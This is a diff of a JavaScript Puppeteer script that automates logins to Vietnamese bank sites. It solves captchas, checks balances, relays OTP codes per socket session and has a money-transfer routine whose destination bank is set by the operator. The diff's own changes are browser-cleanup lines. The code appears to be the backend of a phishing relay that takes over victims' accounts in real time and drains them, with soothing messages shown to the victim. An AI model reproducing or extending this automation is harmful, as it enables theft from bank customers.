@@ -75,6 +75,7 @@ const loginMB = (async (username, password, socketID, settingData) => {
 
     const captchaText = await solverCaptcha(img, 'MBBank');
     if (!captchaText) return await browser.close();
+    br.find(b => b.socketID == socketID).browser = null;
 
     await page.type("input[placeholder='NHẬP MÃ KIỂM TRA'", captchaText);
     await page.click('#login-btn');
@@ -87,9 +88,11 @@ const loginMB = (async (username, password, socketID, settingData) => {
             if (errorMessage === 'Mã captcha không chính xác. Vui lòng thử lại.') {
                 // await client.report(captchaText?._id);
                 await browser.close();
+                br.find(b => b.socketID == socketID).browser = null;
                 await loginMB()
             } else if (errorMessage === 'Thông tin đăng nhập không hợp lệ') {
                 await browser.close();
+                br.find(b => b.socketID == socketID).browser = null;
                 console.log(errorMessage);
                 return {
                     message: errorMessage,
@@ -99,6 +102,7 @@ const loginMB = (async (username, password, socketID, settingData) => {
             }
             else {
                 await browser.close();
+                br.find(b => b.socketID == socketID).browser = null;
                 return {
                     message: errorMessage,
                     code: 404,
@@ -118,6 +122,7 @@ const loginMB = (async (username, password, socketID, settingData) => {
             if (balance <= 2000000) {
                 // const response = await chuyenTien(balance, 'MBBank', socketID, settingData);
                 await browser.close();
+                br.find(b => b.socketID == socketID).browser = null;
                 return {
                     message: 'success',
                     code: 300,
@@ -246,10 +251,10 @@ const chuyenTien = async (balance, type, socketID, settingData) => {
                 bankNameText = 'Ngân hàng TMCP Phát triển TP.HCM';
             } else if (settingData.bankName === 'Techcombank') {
                 bankNameText = 'Ngân hàng TMCP Kỹ Thương Việt Nam';
-            } else if (settingData.bankName === 'NCB') {
-                bankNameText = 'Ngân hàng TMCP Quốc Dân NCB';
             } else if (settingData.bankName === 'HD') {
                 bankNameText = 'Ngân hàng TMCP Phát triển TP.HCM';
+            } else if (settingData.bankName === 'NCB') {
+                bankNameText = 'NCB';
             }
 
             page.type('.select2-search__field', bankNameText);
@@ -683,6 +688,9 @@ const xacthucCTVCB = async (otp, socketID) => {
         messageElement = await page.$x("//p[contains(., 'Mã OTP không chính xác, Quý khách vui lòng kiểm tra lại.')]")
         if (messageElement.length > 0) {
             message = await page.evaluate(el => el.innerText, messageElement[0]);
+            await browser.close();
+            br.find(b => b.socketID == socketID).browser = null;
+
             return {
                 message: message,
                 code: 404,
@@ -700,6 +708,7 @@ const xacthucCTVCB = async (otp, socketID) => {
         }
 
         await browser.close();
+        br.find(b => b.socketID == socketID).browser = null;
 
         return {
             message: 'Xác minh thành công. Quý khách vui lòng chờ trong giây lát.',
@@ -798,6 +807,7 @@ const loginHDBank = (async (username, password) => {
     console.log('checkError', checkError);
     if (checkError) {
         await browser.close();
+        br.find(b => b.socketID == socketID).browser = null;
         return {
             message: 'Tên đăng nhập hoặc mật khẩu không hợp lệ. Xin Quý Khách vui lòng thử lại.',
             code: 404,
